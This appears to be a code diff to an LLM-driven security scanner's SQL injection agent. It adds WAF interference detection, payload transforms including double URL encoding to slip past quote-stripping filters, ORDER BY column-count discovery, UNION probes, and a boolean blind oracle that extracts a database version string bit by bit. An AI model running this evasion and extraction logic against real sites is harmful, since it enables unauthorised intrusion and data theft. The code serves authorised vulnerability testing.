@@ -4,7 +4,7 @@ import asyncio
 import re
 import json
 import time
-from typing import Dict, Any, Tuple, Optional, List
+from typing import Callable, Dict, Any, Tuple, Optional, List
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 from src.core.agents.swarm.thought_loop import ThoughtLoop, ThoughtStep
@@ -14,6 +14,18 @@ from src.core.models.llm import LLMClient
 from src.core.infra.network_client import AsyncNetworkClient
 from src.core.infra.smart_request import SmartRequest
 from src.core.utils.oob_listener import get_oob_listener
+# SGK-2026-0453: pure-function transform catalog + interference
+# classification + selection-strategy seam (stdlib-only module).
+from src.core.agents.swarm.injection.sqli_transform_catalog import (
+    ORACLE_EXTRACTION_PROBE_CAP,
+    DeterministicFixedOrderStrategy,
+    ProbeObservation,
+    ReconInfo,
+    TransformSelectionStrategy,
+    TransformStep,
+    catalog_sequence,
+    classify_interference,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -210,6 +222,12 @@ INPUT: [Input]
         self._error_poc_request = ""
         self._error_poc_response = ""
         self._impact_probe_records: Dict[str, Any] = {}
+        # SGK-2026-0453: evasion-path records (opt-in). _evasion_probe_records
+        # carries the interference verdict / adopted transform / route when the
+        # evasion catalog was attempted; _evasion_route accumulates the observed
+        # probes in send order (win-route freeze — shared with Ver.2).
+        self._evasion_probe_records: Optional[Dict[str, Any]] = None
+        self._evasion_route: List[Dict[str, Any]] = []
         # SGK-2026-0451: deterministic fire-path state (opt-in).
         self._probe_sent = False
         self._last_probe_sent: Optional[bool] = None
@@ -544,6 +562,8 @@ INPUT: [Input]
         self._error_poc_request = ""
         self._error_poc_response = ""
         self._impact_probe_records = {}
+        self._evasion_probe_records = None
+        self._evasion_route = []
         self._probe_sent = False
         loop_result: Dict[str, Any] = {"status": "not_run", "reason": "no_parameters"}
 
@@ -1305,6 +1325,55 @@ History:
         except Exception:  # noqa: BLE001 — settings boundary, fail closed
             return False
 
+    @staticmethod
+    def _evasion_enabled() -> bool:
+        """SGK-2026-0453: opt-in switch for the defense-evasion catalog
+        (interference detection + generic transforms + boolean-oracle
+        extraction fallback). Layered on the 0451/0452 path — requires the
+        firing path AND the impact probe flag. Default off -> existing
+        behavior stays byte-identical."""
+        try:
+            from src.core.config.settings import get_settings
+            settings = get_settings()
+            if not bool(getattr(settings, "sqli_firing_path_enabled", False)):
+                return False
+            if not bool(getattr(settings, "sqli_impact_probe_enabled", False)):
+                return False
+            return bool(getattr(settings, "sqli_evasion_catalog_enabled", False))
+        except Exception:  # noqa: BLE001 — settings boundary, fail closed
+            return False
+
+    def _build_catalog_renderer(self) -> Callable[[str], List[TransformStep]]:
+        """SGK-2026-0453: pure renderer closure bound to the recon db_type
+        (from the sql_error evidence — the demo only runs after an error
+        observation). Deterministic: catalog_sequence(canonical, db_type)."""
+        see = self._sql_error_evidence
+        if not isinstance(see, dict):
+            see = {}
+        db_detection = see.get("db_detection", {})
+        if not isinstance(db_detection, dict):
+            db_detection = {}
+        db_type = str(db_detection.get("type", "") or "").strip().lower()
+
+        def render(canonical: str) -> List[TransformStep]:
+            return catalog_sequence(canonical, db_type)
+
+        return render
+
+    def _record_evasion_observation(
+        self, step: TransformStep, probe: str, obs: Dict[str, Any]
+    ) -> None:
+        """SGK-2026-0453: win-route freeze — append one observed probe in
+        send order (only on the opt-in evasion path)."""
+        if not self._evasion_enabled():
+            return
+        self._evasion_route.append({
+            "step": step.variant,
+            "kind": step.kind,
+            "probe": probe,
+            "observed": self._summarize_probe_result(obs),
+        })
+
     def _prioritize_candidate_params_generic(
         self,
         payload_params: Dict[str, Any],
@@ -1400,9 +1469,11 @@ History:
         compact observation for the LLM loop. This is a firing guarantee
         only; the adaptive loop and payload breadth are unchanged."""
         lines = []
+        plain_observations: List[Dict[str, Any]] = []
         for payload in self._build_error_based_probes(param_name, baseline_value):
             obs = await self._send_request(payload)
             self._probe_sent = True
+            plain_observations.append(obs)
             # SGK-2026-0451: record the fired payload like act() does, so
             # the 0449 evidence/impact fill (payload non-empty requirement)
             # works for fire-path findings too (recording only; the adaptive
@@ -1421,6 +1492,12 @@ History:
                 f"Probe {payload!r}: Status={status}, Diff={diff_type}, "
                 f"ErrorType={error_type or 'none'}, Body={snippet}"
             )
+        # SGK-2026-0453 (opt-in, layered on the 0451/0452 path): interference
+        # detection + generic catalog retry — only when the plain error probes
+        # did NOT observe a sql_error and the evasion flag is on. Fail-closed:
+        # no sql_error regained -> nothing changes (no demonstration).
+        if not self._sql_error_observed and self._evasion_enabled():
+            await self._fire_evasion_probes(param_name, baseline_value, plain_observations)
         # SGK-2026-0452 (opt-in, layered on the 0451 fire path): the safe
         # impact demonstration probe runs ONLY after error-based firing
         # actually observed a SQL error on this parameter (fail-closed: no
@@ -1429,7 +1506,105 @@ History:
             await self._fire_impact_demonstration_probe(param_name, baseline_value)
         return "\n".join(lines)
 
-    async def _send_demo_probe(self, payload: str) -> Dict[str, Any]:
+    async def _fire_evasion_probes(
+        self,
+        param_name: str,
+        base: str,
+        plain_observations: List[Dict[str, Any]],
+    ) -> None:
+        """SGK-2026-0453 (opt-in): interference detection + generic catalog
+        retry over the error-probe family.
+
+        Runs ONLY when _evasion_enabled() and the plain error probes observed
+        no sql_error. classify_interference() decides blocked /
+        stripped_suspected (then the catalog is tried in fixed order) vs
+        no_interference (fail-closed back to the legacy path). The winning
+        transformed probe — when one fires sql_error — is recorded through the
+        SAME _record_sql_observation path (A-1 pinning), so evidence/replay
+        automatically reference the transformed request (win-route freeze).
+        No sql_error regained -> evasion records stay unset (fail-closed)."""
+        baseline_obs = await self._send_request(f"{param_name}={base}")
+        probes = list(zip(
+            self._build_error_based_probes(param_name, base), plain_observations
+        ))
+        verdict = classify_interference(baseline_obs, probes)
+        if verdict.verdict not in ("blocked", "stripped_suspected"):
+            return
+        # Recon from the observed baseline body (no sql_error evidence exists
+        # yet at this stage). Generic DB signature detection — deterministic.
+        db_detection = self._detect_database_type(
+            str(baseline_obs.get("body_snippet", "") or "")
+        )
+        db_type = str((db_detection or {}).get("type", "") or "unknown").lower()
+        canonical = f"{base}'"
+        steps = catalog_sequence(canonical, db_type)
+        strategy = DeterministicFixedOrderStrategy()
+        observations: List[ProbeObservation] = []
+        rejected: set = set()
+        route: List[Dict[str, Any]] = []
+        adopted: Optional[TransformStep] = None
+        while True:
+            step = strategy.next_candidate(
+                candidates=steps,
+                observations=observations,
+                recon=ReconInfo(db_type=db_type),
+                rejected=frozenset(rejected),
+            )
+            if step is None:
+                break
+            # Full request form (param=value) so the evidence payload / route
+            # records match the shape of the existing error-probe family.
+            full_probe = f"{param_name}={step.rendered}"
+            if step.pre_encoded:
+                obs = await self._send_request(full_probe, pre_encoded=True)
+            else:
+                obs = await self._send_request(full_probe)
+            diff_type = str(obs.get("diff", "")).lower()
+            error_type = self._record_sql_observation(obs, full_probe, diff_type)
+            if full_probe not in self.used_payloads:
+                self.used_payloads.append(full_probe)
+            route.append({
+                "step": step.variant,
+                "kind": step.kind,
+                "probe": full_probe,
+                "observed": self._summarize_probe_result(obs),
+            })
+            observations.append(ProbeObservation(
+                step=step,
+                probe=full_probe,
+                result=self._summarize_probe_result(obs),
+                differential=bool(error_type),
+            ))
+            if self._sql_error_observed:
+                adopted = step
+                break
+            rejected.add(step.key)
+        self._evasion_probe_records = {
+            "attempted": True,
+            "interference": {
+                "verdict": verdict.verdict,
+                "reason": verdict.reason,
+                "signals": dict(verdict.signals or {}),
+            },
+            "adopted": (
+                {
+                    "step": adopted.variant,
+                    "kind": adopted.kind,
+                    "canonical": f"{param_name}={canonical}",
+                    "rendered": f"{param_name}={adopted.rendered}",
+                    "poc_request": str(self._error_poc_request or ""),
+                }
+                if adopted is not None
+                else None
+            ),
+            "route": route,
+            "rejected": [{"kind": k[0], "step": k[1]} for k in sorted(rejected)],
+        }
+        self._evasion_route = list(route)
+
+    async def _send_demo_probe(
+        self, payload: str, *, pre_encoded: bool = False
+    ) -> Dict[str, Any]:
         """SGK-2026-0452: send one impact-demonstration probe via the existing
         GET-only _send_request and record its payload (0449 fill requirement:
         payloads stay non-empty). Demonstration probes deliberately do NOT
@@ -1437,6 +1612,10 @@ History:
         error-observation pair stays fixed (A-1)."""
         if payload not in self.used_payloads:
             self.used_payloads.append(payload)
+        # pre_encoded は ENCODING ステップのみ True。False（既定）では
+        # キーワード自体を渡さない（呼び出し形状 byte 等価・既存 mock 互換）。
+        if pre_encoded:
+            return await self._send_request(payload, pre_encoded=True)
         return await self._send_request(payload)
 
     @staticmethod
@@ -1551,15 +1730,39 @@ History:
         # canonical order; the FIRST close/condition pair with a deterministic
         # differential is adopted (fail-closed: no differential anywhere ->
         # observed=False). The adopted close is reused by the extraction.
+        # SGK-2026-0453 (opt-in): on the evasion path the probes go through
+        # the catalog renderer (fixed order) — the canonical (identity) step
+        # is tried first, so an undefended target takes the identical
+        # first-differential path.
+        renderer = self._build_catalog_renderer() if self._evasion_enabled() else None
+        strategy = DeterministicFixedOrderStrategy() if renderer is not None else None
         boolean_records, adopted_close = await self._run_boolean_oracle(
-            param_name, base
+            param_name, base, renderer=renderer, strategy=strategy
         )
         records["boolean_differential"] = boolean_records
 
         # --- 2. non-sensitive one-token extraction (own fail-closed gates) ---
         records["extraction"] = await self._extract_non_sensitive_token(
-            param_name, base, preferred_close=adopted_close
+            param_name, base, preferred_close=adopted_close,
+            renderer=renderer, strategy=strategy,
         )
+
+        # SGK-2026-0453 (opt-in): win-route freeze — the observed send-order
+        # route (error-probe retry + boolean/extraction probes) plus the
+        # adopted transform. Flag off -> no "evasion" key (byte-identical).
+        if self._evasion_enabled():
+            base_evasion = self._evasion_probe_records or {
+                "attempted": False,
+                "interference": {
+                    "verdict": "none",
+                    "reason": "no_interference",
+                    "signals": {},
+                },
+                "adopted": None,
+                "rejected": [],
+            }
+            records["evasion"] = dict(base_evasion)
+            records["evasion"]["route"] = list(self._evasion_route)
 
         self._impact_probe_records = records
         logger.info(
@@ -1570,7 +1773,12 @@ History:
         )
 
     async def _run_boolean_oracle(
-        self, param_name: str, base: str
+        self,
+        param_name: str,
+        base: str,
+        *,
+        renderer: Optional[Callable[[str], List[TransformStep]]] = None,
+        strategy: Optional[TransformSelectionStrategy] = None,
     ) -> Tuple[Dict[str, Any], str]:
         """SGK-2026-0452: boolean differential oracle over the quote/comment
         close variant family.
@@ -1582,7 +1790,13 @@ History:
         difference / JSON row-count difference / body-length difference >=16).
         Returns (records, adopted_close); the adopted close is reused by the
         column-count discovery and the UNION extraction. Fail-closed: no
-        differential anywhere -> observed=False and adopted_close=""."""
+        differential anywhere -> observed=False and adopted_close="".
+
+        SGK-2026-0453 (additive): when ``renderer`` is provided the canonical
+        true/false pair is rendered through the catalog in fixed order (the
+        identity step first) and the first differential wins; ``strategy``
+        picks the next candidate. renderer=None -> byte-identical 0452 path.
+        """
         empty = {
             "observed": False,
             "true_probe": "",
@@ -1590,27 +1804,97 @@ History:
             "false_probe": "",
             "false_result": "",
         }
+        if renderer is None:
+            for close in self._quote_close_variants():
+                for true_cond, false_cond in self._boolean_condition_pairs():
+                    true_probe = f"{param_name}={base}{close} {true_cond} --"
+                    false_probe = f"{param_name}={base}{close} {false_cond} --"
+                    true_obs = await self._send_demo_probe(true_probe)
+                    false_obs = await self._send_demo_probe(false_probe)
+                    if self._has_boolean_differential(true_obs, false_obs):
+                        return (
+                            {
+                                "observed": True,
+                                "true_probe": true_probe,
+                                "true_result": self._summarize_probe_result(true_obs),
+                                "false_probe": false_probe,
+                                "false_result": self._summarize_probe_result(false_obs),
+                            },
+                            close,
+                        )
+            return empty, ""
+
+        # SGK-2026-0453 (opt-in evasion path): catalog-ordered iteration.
+        see = self._sql_error_evidence
+        if not isinstance(see, dict):
+            see = {}
+        db_detection = see.get("db_detection", {})
+        if not isinstance(db_detection, dict):
+            db_detection = {}
+        recon = ReconInfo(
+            db_type=str(db_detection.get("type", "") or "unknown").lower()
+        )
+        strategy = strategy or DeterministicFixedOrderStrategy()
+        rejected: set = set()
+        observations: List[ProbeObservation] = []
         for close in self._quote_close_variants():
             for true_cond, false_cond in self._boolean_condition_pairs():
-                true_probe = f"{param_name}={base}{close} {true_cond} --"
-                false_probe = f"{param_name}={base}{close} {false_cond} --"
-                true_obs = await self._send_demo_probe(true_probe)
-                false_obs = await self._send_demo_probe(false_probe)
-                if self._has_boolean_differential(true_obs, false_obs):
-                    return (
-                        {
-                            "observed": True,
-                            "true_probe": true_probe,
-                            "true_result": self._summarize_probe_result(true_obs),
-                            "false_probe": false_probe,
-                            "false_result": self._summarize_probe_result(false_obs),
-                        },
-                        close,
+                true_canonical = f"{param_name}={base}{close} {true_cond} --"
+                false_canonical = f"{param_name}={base}{close} {false_cond} --"
+                true_steps = {s.key: s for s in renderer(true_canonical)}
+                false_steps = {s.key: s for s in renderer(false_canonical)}
+                candidates = [
+                    s for s in renderer(true_canonical) if s.key in false_steps
+                ]
+                while True:
+                    step = strategy.next_candidate(
+                        candidates=candidates,
+                        observations=observations,
+                        recon=recon,
+                        rejected=frozenset(rejected),
                     )
+                    if step is None:
+                        break
+                    false_step = false_steps[step.key]
+                    true_obs = await self._send_demo_probe(
+                        step.rendered, pre_encoded=step.pre_encoded
+                    )
+                    false_obs = await self._send_demo_probe(
+                        false_step.rendered, pre_encoded=false_step.pre_encoded
+                    )
+                    self._record_evasion_observation(step, step.rendered, true_obs)
+                    self._record_evasion_observation(
+                        false_step, false_step.rendered, false_obs
+                    )
+                    differential = self._has_boolean_differential(true_obs, false_obs)
+                    observations.append(ProbeObservation(
+                        step=step,
+                        probe=step.rendered,
+                        result=self._summarize_probe_result(true_obs),
+                        differential=differential,
+                    ))
+                    if differential:
+                        return (
+                            {
+                                "observed": True,
+                                "true_probe": step.rendered,
+                                "true_result": self._summarize_probe_result(true_obs),
+                                "false_probe": false_step.rendered,
+                                "false_result": self._summarize_probe_result(false_obs),
+                            },
+                            close,
+                        )
+                    rejected.add(step.key)
         return empty, ""
 
     async def _extract_non_sensitive_token(
-        self, param_name: str, base: str, preferred_close: str = ""
+        self,
+        param_name: str,
+        base: str,
+        preferred_close: str = "",
+        *,
+        renderer: Optional[Callable[[str], List[TransformStep]]] = None,
+        strategy: Optional[TransformSelectionStrategy] = None,
     ) -> Dict[str, Any]:
         """SGK-2026-0452: generic non-sensitive one-token extraction.
 
@@ -1628,6 +1912,13 @@ History:
         the closed _version_expr_for_db mapping (DB metadata version functions
         only); unknown/unsupported DB or an unobserved value -> observed=False
         (fail-closed, extraction skipped).
+
+        SGK-2026-0453 (additive): when ``renderer`` is provided the UNION
+        probes are rendered through the catalog in fixed order (identity
+        first). If UNION is blocked but the boolean differential control is
+        available, _extract_token_by_boolean_oracle derives the non-sensitive
+        one token one bit at a time (no timing; hard send cap, fail-closed).
+        renderer=None -> byte-identical 0452 path.
         """
         empty = {
             "observed": False,
@@ -1647,9 +1938,17 @@ History:
         if not pattern:
             return empty
         column_count, close = await self._discover_union_column_count(
-            param_name, base, preferred_close=preferred_close
+            param_name, base, preferred_close=preferred_close,
+            renderer=renderer, strategy=strategy,
         )
+        adopted_close = close or preferred_close
         if column_count <= 0 or not close:
+            # SGK-2026-0453 (opt-in evasion path): UNION discovery blocked but
+            # boolean control available -> deterministic oracle fallback.
+            if renderer is not None and adopted_close:
+                return await self._extract_token_by_boolean_oracle(
+                    param_name, base, adopted_close, expr
+                )
             return empty
         compiled = re.compile(pattern)
         # Control bodies: the version value must not pre-exist in the app's
@@ -1668,26 +1967,48 @@ History:
                     expr if i == position else padding
                     for i in range(1, column_count + 1)
                 ]
-                probe = f"{param_name}=-1{close} UNION SELECT {', '.join(exprs)} --"
-                obs = await self._send_demo_probe(probe)
-                snippet = str(obs.get("body_snippet", "") or "")
-                match = compiled.search(snippet)
-                if not match:
-                    continue
-                value = match.group(0)
-                if any(value in body for body in control_bodies):
-                    continue
-                return {
-                    "observed": True,
-                    "expr": expr,
-                    "value": value,
-                    "probe": probe,
-                    "response_excerpt": snippet,
-                }
+                canonical_probe = (
+                    f"{param_name}=-1{close} UNION SELECT {', '.join(exprs)} --"
+                )
+                steps = renderer(canonical_probe) if renderer is not None else [
+                    TransformStep("identity", 1, canonical_probe, canonical_probe, False)
+                ]
+                for step in steps:
+                    probe = step.rendered
+                    obs = await self._send_demo_probe(
+                        probe, pre_encoded=step.pre_encoded
+                    )
+                    self._record_evasion_observation(step, probe, obs)
+                    snippet = str(obs.get("body_snippet", "") or "")
+                    match = compiled.search(snippet)
+                    if not match:
+                        continue
+                    value = match.group(0)
+                    if any(value in body for body in control_bodies):
+                        continue
+                    return {
+                        "observed": True,
+                        "expr": expr,
+                        "value": value,
+                        "probe": probe,
+                        "response_excerpt": snippet,
+                    }
+        # SGK-2026-0453 (opt-in evasion path): UNION sent but no value ->
+        # boolean-oracle fallback.
+        if renderer is not None and adopted_close:
+            return await self._extract_token_by_boolean_oracle(
+                param_name, base, adopted_close, expr
+            )
         return empty
 
     async def _discover_union_column_count(
-        self, param_name: str, base: str, preferred_close: str = ""
+        self,
+        param_name: str,
+        base: str,
+        preferred_close: str = "",
+        *,
+        renderer: Optional[Callable[[str], List[TransformStep]]] = None,
+        strategy: Optional[TransformSelectionStrategy] = None,
     ) -> Tuple[int, str]:
         """SGK-2026-0452: generic ORDER BY column-count discovery over the
         quote/comment close variant family (N=1..12).
@@ -1696,21 +2017,236 @@ History:
         oracle first, when present) and returns (n, close) for the FIRST
         variant showing the classic deterministic transition: ORDER BY n is a
         clean response and ORDER BY n+1 shows a SQL error. (0, "") when no
-        variant shows the transition -> extraction is skipped (fail-closed)."""
+        variant shows the transition -> extraction is skipped (fail-closed).
+
+        SGK-2026-0453 (additive): when ``renderer`` is provided the ORDER BY
+        probe is rendered through the catalog (fixed order, "<N>" substituted
+        per step); ``strategy`` picks the next step. renderer=None ->
+        byte-identical 0452 path.
+        """
+        if renderer is None:
+            for close in self._ordered_close_variants(preferred_close):
+                prev_obs: Optional[Dict[str, Any]] = None
+                for n in range(1, 14):  # probe N+1 to detect the 12-column boundary
+                    obs = await self._send_demo_probe(
+                        f"{param_name}={base}{close} ORDER BY {n} --"
+                    )
+                    if (
+                        prev_obs is not None
+                        and not self._looks_like_sql_error_response(prev_obs)
+                        and self._looks_like_sql_error_response(obs)
+                    ):
+                        return n - 1, close
+                    prev_obs = obs
+            return 0, ""
+
+        # SGK-2026-0453 (opt-in evasion path): catalog-ordered discovery.
+        strategy = strategy or DeterministicFixedOrderStrategy()
+        rejected: set = set()
+        observations: List[ProbeObservation] = []
         for close in self._ordered_close_variants(preferred_close):
-            prev_obs: Optional[Dict[str, Any]] = None
-            for n in range(1, 14):  # probe N+1 to detect the 12-column boundary
-                obs = await self._send_demo_probe(
-                    f"{param_name}={base}{close} ORDER BY {n} --"
+            template = f"{param_name}={base}{close} ORDER BY <N> --"
+            steps = renderer(template)
+            while True:
+                step = strategy.next_candidate(
+                    candidates=steps,
+                    observations=observations,
+                    recon=ReconInfo(db_type="unknown"),
+                    rejected=frozenset(rejected),
                 )
-                if (
-                    prev_obs is not None
-                    and not self._looks_like_sql_error_response(prev_obs)
-                    and self._looks_like_sql_error_response(obs)
-                ):
-                    return n - 1, close
-                prev_obs = obs
+                if step is None:
+                    break
+                prev_obs: Optional[Dict[str, Any]] = None
+                for n in range(1, 14):
+                    probe = step.rendered.replace("<N>", str(n))
+                    obs = await self._send_demo_probe(
+                        probe, pre_encoded=step.pre_encoded
+                    )
+                    self._record_evasion_observation(step, probe, obs)
+                    if (
+                        prev_obs is not None
+                        and not self._looks_like_sql_error_response(prev_obs)
+                        and self._looks_like_sql_error_response(obs)
+                    ):
+                        return n - 1, close
+                    prev_obs = obs
+                rejected.add(step.key)
         return 0, ""
+
+    async def _extract_token_by_boolean_oracle(
+        self, param_name: str, base: str, close: str, expr: str
+    ) -> Dict[str, Any]:
+        """SGK-2026-0453: deterministic boolean-oracle fallback for the
+        non-sensitive one-token extraction when UNION is blocked but the
+        boolean differential control is available (plan §E).
+
+        - Length: binary search over [1,16] with `length(...) >= n`.
+        - Chars: binary search over the fixed alphabet {0-9,'.','-'} with
+          `{fn}(substr(...,i,1)) > ord(c)` (numeric comparison — no nested
+          quotes, robust against quote-stripping defenses).
+        - One full-token confirmation pair directly observes the assembled
+          value. Every bit is an OBSERVED differential.
+        - No timing; GET-only; hard send cap (ORACLE_EXTRACTION_PROBE_CAP);
+          cap exceeded or a mismatch anywhere -> observed=False (fail-closed).
+        """
+        empty = {
+            "observed": False,
+            "expr": "",
+            "value": "",
+            "probe": "",
+            "response_excerpt": "",
+        }
+        see = self._sql_error_evidence
+        if not isinstance(see, dict):
+            see = {}
+        db_detection = see.get("db_detection", {})
+        if not isinstance(db_detection, dict):
+            db_detection = {}
+        db_type = str(db_detection.get("type", "") or "").lower()
+        fn = {
+            "sqlite": "unicode",
+            "mysql": "ascii",
+            "postgresql": "ascii",
+            "mssql": "unicode",
+        }.get(db_type)
+        if not fn:
+            return empty
+        probes_sent = 0
+        capped = False
+
+        def candidate_pairs(
+            true_pred: str, false_pred: str
+        ) -> List[Tuple[TransformStep, TransformStep]]:
+            """(true, false) step pairs for the canonical predicates, in
+            catalog order (identity first). On the evasion path the probes are
+            rendered through the catalog so the ENCODING transform (double
+            encoding) can cross quote-stripping defenses; off it is identity."""
+            true_canonical = f"{param_name}={base}{close} OR {true_pred} --"
+            false_canonical = f"{param_name}={base}{close} OR {false_pred} --"
+            if not self._evasion_enabled():
+                return [
+                    (
+                        TransformStep("identity", 1, true_canonical, true_canonical, False),
+                        TransformStep("identity", 1, false_canonical, false_canonical, False),
+                    )
+                ]
+            renderer = self._build_catalog_renderer()
+            true_steps = {s.key: s for s in renderer(true_canonical)}
+            false_steps = {s.key: s for s in renderer(false_canonical)}
+            return [
+                (true_steps[key], false_steps[key])
+                for key in (s.key for s in renderer(true_canonical))
+                if key in false_steps
+            ]
+
+        async def observe_predicate(true_pred: str, false_pred: str) -> bool:
+            """Observe whether the predicate holds. Differential IFF true:
+            the pair is (P, constant-false "OR 1=2") in OR-form — never a
+            complement pair. Returns False on cap/mismatch (fail-closed)."""
+            nonlocal probes_sent, capped
+            for true_step, false_step in candidate_pairs(true_pred, false_pred):
+                if probes_sent + 2 > ORACLE_EXTRACTION_PROBE_CAP:
+                    capped = True
+                    return False
+                true_obs = await self._send_demo_probe(
+                    true_step.rendered, pre_encoded=true_step.pre_encoded
+                )
+                false_obs = await self._send_demo_probe(
+                    false_step.rendered, pre_encoded=false_step.pre_encoded
+                )
+                probes_sent += 2
+                self._record_evasion_observation(
+                    true_step, true_step.rendered, true_obs
+                )
+                self._record_evasion_observation(
+                    false_step, false_step.rendered, false_obs
+                )
+                if self._has_boolean_differential(true_obs, false_obs):
+                    return True
+            return False
+
+        # --- length: binary search over [1,16]; differential => len >= n ---
+        # The pair is (P, constant-false): a differential is observed IFF P
+        # holds — a complement pair (P, ¬P) would show a differential for
+        # EVERY n and carry no information.
+        lo, hi, length = 1, 16, 0
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            if not await observe_predicate(
+                f"length((SELECT {expr})) >= {mid}", "1=2"
+            ):
+                if capped:
+                    return empty
+                hi = mid - 1
+            else:
+                length = mid
+                lo = mid + 1
+        if length <= 0 or capped:
+            return empty
+        if not await observe_predicate(
+            f"length((SELECT {expr})) = {length}", "1=2"
+        ):
+            if capped:
+                return empty
+            return empty
+        # --- chars: binary search over the sorted alphabet ords ---
+        # ord()-sorted order (binary search requires a monotonic domain):
+        alphabet = "-.0123456789"
+        ords = [ord(c) for c in alphabet]
+        token_chars: List[str] = []
+        for pos in range(1, length + 1):
+            if capped:
+                return empty
+            lo, hi = 0, len(ords) - 1
+            best = -1
+            while lo <= hi:
+                mid = (lo + hi) // 2
+                val = ords[mid]
+                # differential for (value > val, 1=2) => value > val
+                if not await observe_predicate(
+                    f"{fn}(substr((SELECT {expr}),{pos},1)) > {val}", "1=2"
+                ):
+                    if capped:
+                        return empty
+                    hi = mid - 1
+                else:
+                    best = mid
+                    lo = mid + 1
+            if best == -1:
+                found_char = alphabet[0]
+            elif best == len(ords) - 1:
+                return empty  # value larger than every alphabet member
+            else:
+                found_char = alphabet[best + 1]
+            if capped:
+                return empty
+            if not await observe_predicate(
+                f"{fn}(substr((SELECT {expr}),{pos},1)) = {ord(found_char)}", "1=2"
+            ):
+                if capped:
+                    return empty
+                return empty  # equality mismatch -> not attributable
+            token_chars.append(found_char)
+        token = "".join(token_chars)
+        # --- full-token confirmation (one directly observed differential) ---
+        if capped:
+            return empty
+        confirm_probe = (
+            f"{param_name}={base}{close} OR substr((SELECT {expr}),1,{length})"
+            f"='{token}' --"
+        )
+        if not await observe_predicate(
+            f"substr((SELECT {expr}),1,{length})='{token}'", "1=2"
+        ):
+            return empty
+        return {
+            "observed": True,
+            "expr": expr,
+            "value": token,
+            "probe": confirm_probe,
+            "response_excerpt": "",
+            "method": "boolean_oracle",
+        }
 
     @staticmethod
     def _version_expr_for_db(db_type: str) -> Optional[str]:
@@ -1807,7 +2343,9 @@ History:
         f_len = len(str(false_obs.get("body_snippet", "") or ""))
         return abs(t_len - f_len) >= 16
 
-    async def _send_request(self, payload: str) -> Dict[str, Any]:
+    async def _send_request(
+        self, payload: str, *, pre_encoded: bool = False
+    ) -> Dict[str, Any]:
         """実際のリクエストを送信し、結果を返す"""
         param = self.context.get("param")
         target = self.context.get("target")
@@ -1838,7 +2376,20 @@ History:
                 )
             else:
                 parsed = urlparse(target)
-                new_query = urlencode(params)
+                if pre_encoded:
+                    # SGK-2026-0453 (opt-in, ENCODING transform): the payload
+                    # is already percent-encoded (double-encoded) — insert it
+                    # raw so a second decode layer can unescape it. Other
+                    # params keep the standard encoding path. Default off ->
+                    # byte-identical urlencode() behavior.
+                    rest = urlencode({k: v for k, v in params.items() if k != param})
+                    new_query = (
+                        f"{rest}&{param}={payload_value}"
+                        if rest
+                        else f"{param}={payload_value}"
+                    )
+                else:
+                    new_query = urlencode(params)
                 new_url = urlunparse(parsed._replace(query=new_query))
                 request_url = new_url
 
